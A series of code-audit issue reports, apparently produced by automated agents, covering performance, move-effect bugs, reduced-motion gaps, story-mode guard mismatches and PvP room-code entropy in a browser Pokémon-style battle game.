anchor_symbol: parseMoveEffects-changeStage-tooltipScan
current_line_hint: ~26754
file: battle.html
agents: [performance-profiler]
fingerprint: d3c965d13f23
confidence: high
status: open
---

**Title**: Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan

**Evidence**:
```js
// battle.html:26754 — Charm/Baby-Doll Eyes do ONE changeStage call
if (move.name === "Charm" || move.name === "Baby-Doll Eyes") { changeStage(defender, 'atk', -2, true); return; }
// battle.html:27576-27595 — changeStage interior, every stat tick fires logMsg
mon.stages[stat] = Math.max(-6, Math.min(6, mon.stages[stat] + amount));
if (mon.stages[stat] === oldStage) { logMsg(`${mon.name}'s ${stat.toUpperCase()} won't go any ${amount > 0 ? 'higher' : 'lower'}!`, 'info'); return; }
...
if (amount > 0) AudioSystem.playUiSfx('statUp', 0.5);
else AudioSystem.playUiSfx('statDown', 0.5);
if (amount > 2) logMsg(`${mon.name}'s ${statName} rose drastically!`, 'heal');
...
showStatArrow(amount > 0, mon === state.pActive);
```

**Repro**: 200 moves × 3 passes via `engine.parseMoveEffects`, jsdom harness, 2026-05-28 (`/tmp/deep-perf.mjs`). Top 10 slowest medians:

| Move           | Median ms | Max ms |
|----------------|-----------|--------|
| Decorate       |     1.740 |  1.793 |
| Coaching       |     1.595 |  1.613 |
| Baby-Doll Eyes |     0.861 |  1.022 |
| Aromatic Mist  |     0.857 |  0.952 |
| Breaking Swipe |     0.855 |  0.880 |
| Captivate      |     0.836 |  1.535 |
| Bitter Malice  |     0.826 |  1.611 |
| Calm Mind      |     0.818 |  1.424 |
| Confide        |     0.813 |  1.054 |
| Double Team    |     0.811 |  0.841 |

Bottom 5 (Tackle/Double Slap/Dragon Tail) median ~0.015 ms. Spread: **~110× from fastest to slowest.** Charts directly with logMsg-per-stat-tick count: Decorate raises +2 in two stats = ~4 logMsg calls × 0.32 ms = ~1.3 ms, matching observed 1.7 ms once `playUiSfx` + `showStatArrow` DOM work is added.

**Blast radius**: A setup-sweeper turn (Dragon Dance, Calm Mind, Bulk Up, Shell Smash) executes a stat-change-heavy parseMoveEffects on **every player turn for the first 2-3 turns of most battles**. At 0.8-1.7 ms per move, that's the dominant cost slice of those turns. Multi-stat moves (Shell Smash: 6 ticks, Quiver Dance: 3 ticks) compound. Linked to ISSUE-154/155 (P3 already in ledger) as the underlying mechanism.

**Fix sketch**: Fixing the logMsg scan (see fingerprint 290cc0fb39e4 above) is the primary lever — drops these costs by ~70%. Secondary: hoist the `statNames`/`stat.toUpperCase()` calls and inline the `mon.volatile.statsRaisedThisTurn` object-init out of the hot path.

**Verification**: Re-time Decorate/Coaching/Calm Mind after the logMsg fix; expect ~0.3 ms each (a 5× drop). Variance ratio (slowest:fastest) should fall from 110× to under 20×.

---

## <a id="ISSUE-368"></a> ISSUE-368: Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median)

---
id: ISSUE-368
severity: P3
category: perf
anchor_symbol: parseMoveEffects-sets-warm
current_line_hint: ~25859
file: battle.html
agents: [performance-profiler]
fingerprint: d2f020bcc302
confidence: high
status: open
---

**Title**: Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median)

**Evidence**: Counted `new Set(` occurrences in `parseMoveEffects` body (battle.html:25853–~26900): **18 distinct Set literals**, ranging in size from 3 elements (`hardBlockAll`) to 53 (`_selfTargetMoves`). The first ~5 fire on every call (powderMoves, magicBounceMoves, _subBypassMoves, _selfTargetMoves, sometimes _ccBanned); the remaining 13 fire in conditional branches but together compose the typical hot path.

```js
// battle.html:25859 — first Set, fires on every call regardless of move type
const powderMoves = new Set(["Sleep Powder","Spore","Stun Spore","Poison Powder","Rage Powder","Cotton Spore","PoisonPowder","Powder"]);
if (powderMoves.has(move.name)) { ... }
// battle.html:25867
const magicBounceMoves = new Set(["Will-O-Wisp","Thunder Wave",...]);  // 39 elements
// battle.html:25877
const _subBypassMoves = new Set([...]);  // 18 elements
// battle.html:25878
const _selfTargetMoves = new Set([...]);  // 53 elements
// ...total 18 Sets allocated through the function body
```

**Repro**: Isolated micro-bench (`/tmp/setbench.mjs`, 2026-05-28) replaying the actual literal contents from `parseMoveEffects`:
- Per-call allocation of all 17 Sets × 50,000 iterations: **653 ms, i.e. 13.1 μs per call.**
- Hoisted (constants) × 50,000 same has-checks: **1.91 ms total, i.e. 0.04 μs per call.**
- **Savings: ~13 μs per parseMoveEffects call. The function's warm median is 18 μs, so this is ~70% of the per-call cost.**

This restates and quantifies ISSUE-156 (P3 already in ledger). ISSUE-156 counted 19 (probably included a redundant declaration); the live audit counts 18 inside `parseMoveEffects` proper. Numbers may shift slightly when `parseMoveEffects` is refactored; the takeaway is the order-of-magnitude saving.

**Blast radius**: At ~18 μs / move and 2 moves per turn (player + foe), ~36 μs / turn. Across a 30-turn battle, ~1 ms. Across a 100-battle replay, ~100 ms of CPU. Per battle the saving is invisible; **the value is that it scales**: every new Set literal added inside `parseMoveEffects` linearly costs μs per call. Story content (new moves added with new ban-lists) will continue to drift this up unless the pattern is moved out.

**Fix sketch**: Hoist all 18 Sets to module-level `const` declarations. The Sets are immutable; freezing is not required. Existing examples at battle.html:10165–10185 (`_SETUP_MOVES`, `_HAZARD_MOVES`, etc.) show the pattern already in use elsewhere in the file.

**Verification**: Bench `parseMoveEffects` per-move median after hoisting; expect median to drop from 0.018 ms → 0.005 ms (a ~3.5× speedup) and the per-turn cost to fall correspondingly. Status moves (Decorate etc.) will see proportional improvement once the logMsg fix is also in.

---

## <a id="ISSUE-369"></a> ISSUE-369: Several status moves have no observable effect in the battle engine

---
id: ISSUE-369
severity: P3
category: bug
anchor_symbol: Power Shift
current_line_hint: ~24000
file: battle.html
agents: [test-coverage-filler]
fingerprint: 1c0e0b5ce79f
confidence: medium
status: open
---

**Title**: Several status moves have no observable effect in the battle engine

**Evidence**:
```text
Confirmed no-op (state directly inspected, jsdom harness):
  Power Shift   — raw Atk/Def unchanged after use
  Corrosive Gas — foe's held item not removed
  Purify        — foe's status not cured (and no user heal)
  Venom Drench  — poisoned foe's Atk/SpA/Spe not lowered
  Ion Deluge    — ionDeluge flag stays false
  Crafty Shield — does not block an incoming status move (foe still paralyzes)
  Mat Block     — does not block an incoming damaging move (turn 1)
To verify (no effect under generic setup — may be doubles-only or precondition-gated):
  Nature Power, Copycat, Mirror Move, Parting Shot, Doodle, Electrify, Fairy Lock,
  Nightmare, Disable, Laser Focus
```

**Repro**: jsdom harness; each move used by Mew vs Snorlax (preconditions set where relevant — foe poisoned for Venom Drench, foe statused for Purify, foe priority/spread move for the guards). None produced their documented effect. These are left as it.todo in the move drafts.

**Blast radius**: Mostly niche moves; low story impact individually. Crafty Shield / Mat Block / Trick (separate finding) are the most likely to matter if a foe relies on them.

**Fix sketch**: Triage per move — confirm gap vs. doubles-only/precondition before implementing. The "confirmed" group is high-confidence dead; the "to verify" group needs a targeted repro (correct prior-move / ally context) to rule out a harness artifact.

**Verification**: Each listed move produces its effect in a deterministic repro, and the corresponding draft todo is filled.

---

## <a id="ISSUE-370"></a> ISSUE-370: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

---
id: ISSUE-370
severity: P3
category: a11y
anchor_symbol: prefers-reduced-motion
current_line_hint: ~58
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b14deb83ca98
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

**Evidence**:
```
$ grep -cE '@keyframes' battle.html
129
$ grep -cE 'prefers-reduced-motion' battle.html
5
$ grep -nE 'prefers-reduced-motion' battle.html
58:        @media (prefers-reduced-motion: reduce) {           # confetti, badge, rotate icon, hp-critical (4 rules)
5383:       @media (prefers-reduced-motion: reduce) {           # casino flip/wheel/slots/jackpot
6206:       @media (prefers-reduced-motion: reduce) {           # screen-trans + bottom-sheet
8696:        if (… '(prefers-reduced-motion: reduce)').matches) return;   # one-off in JS
26796:                try { return !!(… '(prefers-reduced-motion: reduce)').matches); }  # StoryFx isReduced flag
```

Storage of the StoryFx flag (line 26796) covers JS-driven sequences nicely, but pure CSS animations escape it. Examples of unguarded multi-second animations: `storyTutorialOverlayIn` / `storyTutorialSpriteIn` / `storyTutorialNameIn` / `storyTutorialDialogIn` (tutorial reveal cascade, lines ~4267-4296), `storyCatchMasterPulse` (Master Ball, infinite 2.2s loop, line ~1912), `storyBadgePulse` (victory badge — the line-60 override hits `.story-victory-badge-slot` but the `@keyframes storyBadgePulse` continues running on any other element that uses it).

**Repro**: macOS System Settings → Accessibility → Reduce Motion → On. Trigger first wild — sprite still scales & translates from off-screen; Master Ball still pulses every 2.2 s.

**Blast radius**: Vestibular-disorder users get the same motion onslaught as the default theme. Infinite pulse loops are particularly hostile.

**Fix sketch**: Wrap CSS animation declarations in a single `@media (prefers-reduced-motion: reduce) { *[class*="story-tutorial-"] { animation: none !important; } .story-catch-ball--master { animation: none !important; box-shadow: 0 0 14px rgba(206,147,216,0.55) !important; } … }` block. Audit the 129 keyframes and short-list the ≥800 ms / infinite ones (probably ~25 selectors).

**Verification**: With reduced-motion on, no element on the catch screen or tutorial overlay animates for >100 ms.

---

## <a id="ISSUE-371"></a> ISSUE-371: proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces

---
id: ISSUE-371
severity: P3
category: bug
anchor_symbol: proceedToNextBattle
current_line_hint: ~41826
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7a285290260d
confidence: low
status: open
---

**Title**: proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces

**Evidence**:
```js
function proceedToNextBattle() {
    if (sm.team.length === 0) { ...return; }   // counts eggs
    // ...later sets sm.eventIndex = nextBattleIdx; save();
}
// vs the launch path:
if (_storyCountFighters() === 0) { window.showGameAlert('You have no Pokémon...'); enterCity(); return; } // excludes eggs
```

**Repro**: `proceedToNextBattle` passes its guard whenever `sm.team.length > 0` — including a party that is all eggs (0 fighters). It then advances `sm.eventIndex` to the next Battle row and saves BEFORE `enterBattleEvent`'s `_storyCountFighters() === 0` guard fires, bounces to city, and `eventIndex` is left on (or near) the battle row until the next city walk-back. Currently NOT reachable in normal play — `pcDeposit`/`pcSell`/`pcRelease` all block removing the last non-egg fighter (`_pcTeamHasOnlyOneMon` counts `!isEgg`), so a 0-fighter party can't form. Latent guard mismatch, not an exploit today.

**Blast radius**: None observed; defensive only. Becomes a real bounce/soft-lock if any future feature lets eggs fully occupy the party (e.g. multi-egg daycare, egg-only gifts).

**Fix sketch**: Make `proceedToNextBattle` use `_storyCountFighters() === 0` for parity with the launch guard, and don't advance `sm.eventIndex` before confirming a fightable party.

**Verification**: Force an all-egg `sm.team`, call `proceedToNextBattle` — confirm eventIndex is NOT advanced and the player is routed to the Professor/city without a stale battle index.

---

## <a id="ISSUE-372"></a> ISSUE-372: proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces

---
id: ISSUE-372
severity: P3
category: inconsistency
anchor_symbol: proceedToNextBattle
current_line_hint: ~41881
file: battle.html
agents: [story-mode-investigator]
fingerprint: a1eccebec359
confidence: medium
status: open
---

**Title**: proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces

**Evidence**: `proceedToNextBattle` (~41881) gates on raw party length:
```js
if (sm.team.length === 0) { window.showGameAlert('You have no Pokémon. Visit the Professor first.'); return; }
```
But eggs occupy a party slot (`isEgg:true`) and cannot battle, and the rest of the codebase counts fighters via `_storyCountFighters()` (`team.filter(s => s && !s.isEgg).length`) — including the actual fight launch (~42457: `if (_storyCountFighters() === 0) { ...; enterCity(); return; }`). An egg-only party (team.length 1, fighters 0) passes the `proceedToNextBattle` guard, advances `sm.eventIndex` to the battle, fires the cold-open and route wilds, then is bounced back to the city by the `startFight` guard — and the eventIndex has already been advanced. (Combined with the cold-open re-entry bug, the bounce can stack overlays.)

**Repro**: Set a party to a single egg slot, call `StoryMode.proceedToNextBattle()` — it advances/bounces instead of warning up front. Egg-only is hard to reach via UI (deposit/daycare guard the last fighter via a DISABLED button, but `_daycareDropOff`'s handler ~40054 lacks the `lastInParty` re-check that `evoLabEvolve` and friends have), so this is defense-in-depth rather than a confirmed live path.

**Blast radius**: No-Pokémon edge handling; consistency of the fighter-count contract.

**Fix sketch**: Use `_storyCountFighters() === 0` in `proceedToNextBattle` (and add the `lastInParty` guard inside `_daycareDropOff` to match the disabled-button gate).

**Verification**: With an egg-only party, `proceedToNextBattle` should warn and NOT advance the eventIndex.

---

## <a id="ISSUE-373"></a> ISSUE-373: Mystery-mode Accept has no double-submit guard (re-renders swap picker on repeat clicks)

---
id: ISSUE-373
severity: P3
category: bug
anchor_symbol: profAccept
current_line_hint: ~45274
file: battle.html
agents: [story-mode-investigator]
fingerprint: 78f8cae7d0de
confidence: medium
status: open
---

**Title**: Mystery-mode Accept has no double-submit guard (re-renders swap picker on repeat clicks)

**Evidence**:
```js
function profAccept() {
    if (_profSelectedIdx === null || !_pendingProfChoices) return; // guards normal path
    ...
    if (_profMysteryMode) {
        // builds swap picker; does NOT null _pendingProfChoices here
        return;
    }
    _pendingProfChoices = null; // only the NORMAL path clears state
```

**Repro**: In mystery / legendary-gate mode, clicking "Take <mon>" repeatedly re-renders the swap picker each time (state not cleared until _mysteryDoSwap/_mysterySendToPc run). Idempotent re-render so no corruption, but distinct from the normal path which is guarded. Low risk.

**Blast radius**: Cosmetic flicker; the actual mutation (_mysteryDoSwap/_mysterySendToPc) is single-shot via its own pending-null checks.

**Fix sketch**: Optional: set a transient busy flag while the swap picker is shown, or no-op Accept once the picker is already rendered.

**Verification**: Rapid double-click Accept in mystery mode; confirm no duplicate/desynced swap state.

---

## <a id="ISSUE-374"></a> ISSUE-374: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

---
id: ISSUE-374
severity: P3
category: bug
anchor_symbol: randomCode
current_line_hint: ~44
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: aee012742c28
confidence: medium
status: wontfix-room-code-is-addressing-not-secret-tokens-protect-writes
---

**Title**: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

**Evidence**:
```js
// online-pvp.js L44-49
function randomCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';   // 32 chars (no I/O/1/0 → ambiguous-safe)
    let s = '';
    for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}
// L341-351 retry loop tolerates 8 collisions before giving up.
```

**Repro**: 32^6 = ~1.07 billion codes; birthday paradox says collision probability hits 50% at ~37K codes simultaneously in flight. With 8 retries the practical ceiling is much higher (each attempt has 1 - codes_in_use/1e9 ≈ 1 success prob even at 1M live rooms), so this is fine *for correctness*. The real concern is enumeration: an attacker who can call `fetchRoomByCode(code)` (no rate limit visible) can brute-force the ~1B codespace. At 10 lookups/sec from a single client and the open SELECT policy, finding a specific 6-char code takes a year on average; finding *any* live room takes seconds (~1000 rooms / 1B = ~1M attempts = 27 hours). With the open RLS, the attacker can short-circuit by `select('code') from pvp_rooms` instead — making the codespace strength irrelevant.

**Blast radius**: Defensive. Under tightened RLS (see the P0/P1 RLS findings), the code becomes the secret that gates joining; at that point, 30-bit entropy is shaky for a feature meant to defend against opportunistic eavesdroppers. Realistically, room codes need to be share-friendly (length 6, no ambiguous chars) so the 30 bits cap is by design.

**Fix sketch**: For correctness alone, no change needed (the retry on 23505 handles collisions). For privacy of in-progress matches: combine the code with an opaque per-room access token returned from `createRoom` and required as a header on every read (see the P1 SELECT-RLS finding's RPC design). The code stays human-shareable; the token is the real secret.

**Verification**: Existing integration test `tests/integration/pvp-stub.test.js:101-111` samples 1000 codes and asserts ≥990 unique — this validates collision rate, not unguessability.

---

## <a id="ISSUE-375"></a> ISSUE-375: README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming"

---
id: ISSUE-375
severity: P3
category: dx
anchor_symbol: README.md
current_line_hint: n/a
file: README.md
agents: [spec-drift-auditor]
fingerprint: 1f3b34879073
confidence: high
status: open
---

**Title**: README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming"

**Evidence**:
```
README.md:44
  "See STORY_MODE_FLOW.md for the working spec of the upcoming
   catch / PC / Underground / Safari / boss-arc systems."
Reality (all shipped & reachable):
  catch  -> #screen-story-catch + StoryMode.catchThrow   Safari -> 236 hits, City4
  PC     -> sm.pcBox (44 hits), story-pc-tab-storage-btn  Underground -> story-pc-tab-underground-btn (sells mons for gold)
  boss-arc -> _bossArcRollLegendary (Caged God, 15 hits)
```

**Repro**: `grep -cniE "safari|pcBox|underground|_bossArcRollLegendary" battle.html` confirms each system is live in the UI. README still frames them as future work.

**Blast radius**: Low — README is a dev/testing doc, not user-facing feature copy. But it is the entry point the repo points new contributors to (and links STORY_MODE_FLOW.md as the "working spec of upcoming" systems), so it understates what is actually shipped. Required-check #6 (README claims reachable): all named systems ARE reachable; the staleness is the "upcoming" framing, not an unreachable claim.

**Fix sketch**: Reword README line 44 to "the shipped catch / PC / Underground / Safari / boss-arc systems" (or split shipped vs. still-deferred: Black Market / wager / trader / itinerary remain unshipped per the deferred ledger items). Doc owner's edit.

**Verification**: README no longer labels live systems "upcoming".

---

## <a id="ISSUE-376"></a> ISSUE-376: Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale

---
id: ISSUE-376
severity: P3
category: balance
anchor_symbol: renderCityActions
current_line_hint: ~38989
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4066d35d9141
confidence: high
status: open
---

**Title**: Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale

**Evidence**:
```text
Move Tutor   present at: C0, C2, C3, C4, C5, C6, C7, C8, C9   (skips C1 only)
Nature Rater present at: C0,     C3,     C5, C6, C7, C8, C9   (skips C1, C2, C4)
```

**Repro**: Per-city action extraction from `STORY_EVENTS_RAW`. Both Move Tutor and Nature Rater are "always-on RNG-negators" per REDESIGN_PLAN §2, but the actual literal omits Nature Rater at C1/C2/C4 and Move Tutor at C1. There is no `actions.includes('Nature Rater')` gate beyond the literal — the absence is just missing array entries, not a deliberate unlock condition. So a player who wants to fix a bad nature at C2/C4 simply can't.

**Blast radius**: Inconsistent service availability for two facilities the design treats as ubiquitous. A nature-locked mon caught/gifted at C2 waits until C3 for the Rater.

**Fix sketch**: Either (a) add 'Move Tutor'/'Nature Rater' to the missing City rows' action arrays for true always-on, or (b) if the omissions are intentional pacing (city-specialty per §14c), document them in `CITY_SPECIALTY_BLURBS` and STORY_MODE_FLOW. REDESIGN_PLAN §2 already proposes the "always-on" fix.

**Verification**: Re-extract action lists; confirm Nature Rater appears (or is documented-absent) at every city.

---

## <a id="ISSUE-377"></a> ISSUE-377: Rival-gate tip labelled "Heal …" deep-links to the Poké Center, which performs no heal

---
id: ISSUE-377
severity: P3
category: dx
anchor_symbol: renderCityActions
current_line_hint: ~42674
file: battle.html
agents: [story-mode-investigator]
fingerprint: 99d6d7a2d22b
confidence: medium
status: open
---

**Title**: Rival-gate tip labelled "Heal …" deep-links to the Poké Center, which performs no heal

**Evidence**:
```js
if (rivalGateActive) {
    const _healTipLabel = _willFireWildNext ? 'Heal — your rival waits at the end of the road' : 'Heal — your rival is at the route gate';
    tips.push({ ..., label: _healTipLabel, click: 'window.StoryMode.enterPokemonCenter()' });
}
```

**Repro**: Reach a post-gym rival route (City 3 / City 6). The tip rail shows a "Heal — …" chip routing to the Center, which only opens PC/Underground. Also: rival fights are iconic and auto-heal+clear-fatigue on entry anyway, so the prompt to "heal first" is moot.

**Blast radius**: Reinforces the false Center=heal model. Minor — purely advisory chip.

**Fix sketch**: Relabel to "Prep your team" / route to Party or Tutor, or drop the chip since the rival fight starts the team fresh regardless.

**Verification**: Tip label and target match the facility's behavior.

---

## <a id="ISSUE-378"></a> ISSUE-378: Dead `'Cyrus'` Mystery-Figure sprite fallbacks remain after the identity was collapsed to a single value ('the_first' / Red)

---
id: ISSUE-378
severity: P3
category: refactor
anchor_symbol: renderCityActions
current_line_hint: ~42571
file: battle.html
agents: [story-mode-investigator]
fingerprint: 3de6970b8557
confidence: high
status: open
---

**Title**: Dead `'Cyrus'` Mystery-Figure sprite fallbacks remain after the identity was collapsed to a single value ('the_first' / Red)

**Evidence**:
```js
// renderCityActions city-hub tease:
spriteTrainerArg = _mysteryFace && _mysteryFace.sprite ? _mysteryFace.sprite : 'Cyrus';
// enterProfessor legendary-gate sprite:
document.getElementById('story-prof-sprite').src = getTrainerSprite(... ? (_mysteryFace && _mysteryFace.sprite ? _mysteryFace.sprite : 'Cyrus') : ...);
```
`MYSTERY_FIGURE_IDENTITIES` now has exactly one entry (`the_first`, sprite 'Red'), and `_storyEnsureMysteryIdentity` always returns it. The `'Cyrus'` fallbacks can never fire — leftover from the retired 9-identity rotation. Harmless but misleading (a reader could think the MF can still be Cyrus).

**Repro**: `_mysteryFace.sprite` is always 'Red'; the `: 'Cyrus'` branch is unreachable.

**Blast radius**: None functional — code clarity only.

**Fix sketch**: Replace the `'Cyrus'` fallbacks with `'Red'` (or `MYSTERY_FIGURE_IDENTITIES.the_first.sprite`) so the dead-code reading isn't a wrong reading.

**Verification**: No `'Cyrus'` string remains in the Mystery-Figure sprite paths.

---

## <a id="ISSUE-379"></a> ISSUE-379: Party count chip shows "(N/6)" regardless of the actual badge-driven cap

---
id: ISSUE-379
severity: P3
category: bug
anchor_symbol: renderTeamPanel
current_line_hint: ~36657
file: battle.html
agents: [story-mode-investigator]
fingerprint: c83c6453be8a
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Party count chip shows "(N/6)" regardless of the actual badge-driven cap

**Evidence**:
```js
// battle.html ~36657
if (countEl) countEl.textContent = sm.team.length ? `(${sm.team.length}/6)` : '';
```
`_storyMaxPartySize()` returns `Math.max(2, Math.min(6, 2 + badges))` — so a 0-badge player has a cap of **2**, not 6. The party count shows "1/6" at City 0 even though the player can only field 2.

**Repro**: Start a fresh story run, take a starter, look at the HUD's party count.

**Blast radius**: Cosmetic. The player who reads "1/6" might think they can hold 6 mons and be surprised when Catch Tutorial overflows to PC. Also subtly conveys the wrong difficulty signal.

**Fix sketch**: 
```js
const _capForDisplay = (typeof _storyMaxPartySize === 'function') ? _storyMaxPartySize() : 6;
countEl.textContent = sm.team.length ? `(${sm.team.length}/${_capForDisplay})` : '';
```
The PC overflow error message at line 40487 already does this correctly (`${maxParty}`), so this is the lone display lag.

**Verification**: At 0 badges with 1 mon, chip should read "1/2"; at 4 badges with 5 mons, chip should read "5/6".

---

## <a id="ISSUE-380"></a> ISSUE-380: CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive)

---
id: ISSUE-380
severity: P3
category: balance
anchor_symbol: RIVAL_ATTACK_TYPE_DECAY
current_line_hint: ~33108
file: battle.html
agents: [story-mode-investigator]
fingerprint: de6142450105
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive)

**Evidence**:
```js
const RIVAL_ATTACK_TYPE_DECAY = 10;   // battle.html:33108 (was 30)
```

**Repro**: Prior audit 1.2 said `RIVAL_ATTACK_TYPE_DECAY = ÷30` neutralized the rival's counter-pick after 1–2 picks. It is now 10 (33108), used in `_rivalScoreAttackTypeVsParty` weighting (33155/33177). Rivals counter-pick more persistently against monotype parties. Reads live `sm.team` (does not filter `wild:true` per spec §3).

**Blast radius**: Tier-2 #10 — resolved.

**Fix sketch**: None — confirmation.

**Verification**: Face a rival with a monotype party; confirm sustained type counter-picking across slots.

---

## <a id="ISSUE-381"></a> ISSUE-381: Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros`

---
id: ISSUE-381
severity: P3
category: bug
anchor_symbol: rollMysteryFigureFinalBossTeam
current_line_hint: ~38014
file: battle.html
agents: [story-mode-investigator]
fingerprint: b99d78121766
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros`

**Evidence**:
```js
// battle.html ~38016
let trainer = isMysteryFinal
    ? {
        role: 'Mystery Figure',
        ...
        introQuotes: (_mysteryFinalFace && _mysteryFinalFace.intros) || [
            'Your Hall of Fame crown means nothing here.',
            'Show me your strongest six.'
        ]
    }
```
The 2-line fallback would be used if the rolled `mysteryIdentity` somehow doesn't have an `intros` field. All currently-shipped identities (`cyrus`, `ghetsis`, `cynthia`, `steven`, `n`, `red`, `lance`, `buried_alive`, `cartridge_self`) DO have `intros: [...]` — so the fallback is dead in practice. But if a future identity is added without `intros`, the fight silently rolls 2 generic lines instead of catching the omission.

**Repro**: Add a test identity to MYSTERY_FIGURE_IDENTITIES with no `intros` field. The Mystery Figure final fight uses the 2-line fallback.

**Blast radius**: Future-proofing only. No current user impact.

**Fix sketch**: Either (a) move the fallback to be a console.warn + explicit asserter so missing `intros` is caught at the call site; or (b) tighten the type contract by adding a `_validateMysteryIdentity` assertion in `MYSTERY_FIGURE_IDENTITIES` boot block.

**Verification**: Add an identity without `intros`; expect a console warning instead of silent fallback.

---

## <a id="ISSUE-382"></a> ISSUE-382: Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded

---
id: ISSUE-382
severity: P3
category: inconsistency
anchor_symbol: rollMysteryFigureFinalBossTeam
current_line_hint: ~34631
file: battle.html
agents: [story-mode-investigator]
fingerprint: cb88ee48b37a
confidence: high
status: open
---

**Title**: Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded

**Evidence**:
```js
const _mechCtx = { settings: { ...sm.settings, megaOn: true, dynaOn: true, teraOn: true, zOn: true } };
// ...but _applyEnemyGimmickDistribution → _storyEnemyMechKeys ANDs with sm.unlockedGimmicks:
//   if (S.megaOn && unlocked.has('mega')) k.push('mega');   ← unlocked is empty
return _applyStoryBuildPowerTier(_applyEnemyGimmickDistribution(picks, 'Mystery Figure', _mechCtx), 'Mystery Figure', null);
```

**Repro**: Start a run with all 4 mechanic checkboxes (Mega/Z/Dynamax/Tera) unchecked — all default checked but are user-toggleable, with no floor forcing at least one. `sm.unlockedGimmicks` then stays `[]` forever (it's filled from `sm.settings.*On`, ~line 42687). At the post-HoF Mystery Figure, `rollMysteryFigureFinalBossTeam` forces `megaOn:true` etc. in `_mechCtx`, but `_storyEnemyMechKeys` requires `unlockedGimmicks.has('mega')` too — so it returns `[]` and the climactic boss (which guarantees 6 gimmick mons via `_minGuaranteedMechsForEvent`) gets zero. Verified by emulating `_storyEnemyMechKeys` with forced ctx + empty unlocked → keys = [].

**Blast radius**: The intended climax difficulty spike is silently nullified for all-mechanics-off runs. Not a crash; the boss is just a standard G1 team. The comment "Final boss rolls from every unlocked mechanic" is misleading — the forced ctx settings never override the unlock gate.

**Fix sketch**: Either make the Mystery Figure's mech keys ignore `unlockedGimmicks` (the post-HoF boss is meant to transcend the player's run gates), or drop the dead `_mechCtx` setting-override and document that an all-off run yields a gimmickless climax by design.

**Verification**: All-mechanics-off run reaching the Mystery Figure — assert the boss team has ≥1 gimmick (if the intended behavior is "always gimmicked") or document the no-gimmick outcome.

---

## <a id="ISSUE-383"></a> ISSUE-383: `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work

---
id: ISSUE-383
severity: P3
category: perf
anchor_symbol: rollTrainerTeam
current_line_hint: ~34915
file: battle.html
agents: [performance-profiler]
fingerprint: 82c78848cd39
confidence: medium
status: open
---

**Title**: `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work

**Evidence**:
```js
// battle.html:34915 — entry point exposed via window.__rivalTest.rollTrainerTeam
function rollTrainerTeam(trainer, partySize, gradeWeights, enabledGensIn, battleEventType, storyRowIdx) {
    const rng = (sm && sm.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;
    let gwIn = applyDifficultyToGradeWeights(gradeWeights || { g1: 0, g2: 0, g3: 50, g4: 50 });
    gwIn = applyStoryProgressToGradeWeights(gwIn, storyRowIdx);
    ...
    const _poolKey = (isMixed ? 'mixed' : types.slice().sort().join('+')) + '|' + Array.from(genSet).sort((a, b) => a - b).join(',');
    let T = _trainerPoolCache.get(_poolKey);  // cache keyed on type+gens — hit rate is the main lever
```

**Repro**: 10 trainers (Brock, Misty, Lt.Surge, Erika, Sabrina, Blaine, Giovanni, Lance, Steven Stone, Cynthia), 5 trials each, 1 warmup, all gens enabled, gradeWeights {g3:50,g4:50}. (`/tmp/deep-perf2.mjs`, 2026-05-28.)
- **All 50 samples**: median **0.71 ms**, p95 **2.09 ms**, max **6.62 ms**, mean **0.97 ms**.
- **Cold pass only (10 first-time trainers)**: median **1.42 ms**, p95 **3.22 ms**, mean **1.63 ms**.

